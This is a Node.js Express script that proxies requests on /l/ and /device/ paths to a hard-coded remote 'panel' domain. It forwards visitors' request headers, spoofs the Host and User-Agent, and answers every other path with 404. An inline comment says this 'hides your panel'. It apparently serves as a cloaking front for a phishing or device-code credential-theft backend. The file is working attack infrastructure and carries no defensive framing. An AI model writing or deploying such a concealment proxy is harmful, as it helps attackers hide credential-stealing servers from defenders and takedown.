const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

const PANEL = 'portal42-343.sbs';

// ---- Proxy for /l/ and /device/ ----
app.use('/l/*', async (req, res) => {
    try {
        const target = new URL(req.originalUrl, `https://${PANEL}`);
        const headers = new Headers(req.headers);
        headers.set('Host', PANEL);
        headers.set('User-Agent', 'Mozilla/5.0');
        const response = await fetch(target.toString(), { method: req.method, headers });
        const body = await response.text();
        res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
    } catch (e) {
        res.status(500).send('Proxy Error');
    }
});

app.use('/device/*', async (req, res) => {
    try {
        const target = new URL(req.originalUrl, `https://${PANEL}`);
        const headers = new Headers(req.headers);
        headers.set('Host', PANEL);
        headers.set('User-Agent', 'Mozilla/5.0');
        const response = await fetch(target.toString(), { method: req.method, headers });
        const body = await response.text();
        res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
    } catch (e) {
        res.status(500).send('Proxy Error');
    }
});

// ---- Root and all other paths – 404 (hides your panel) ----
app.use('*', (req, res) => {
    res.status(404).send('Not Found');
});

app.listen(port, () => console.log('✅ Proxy running on port ' + port));
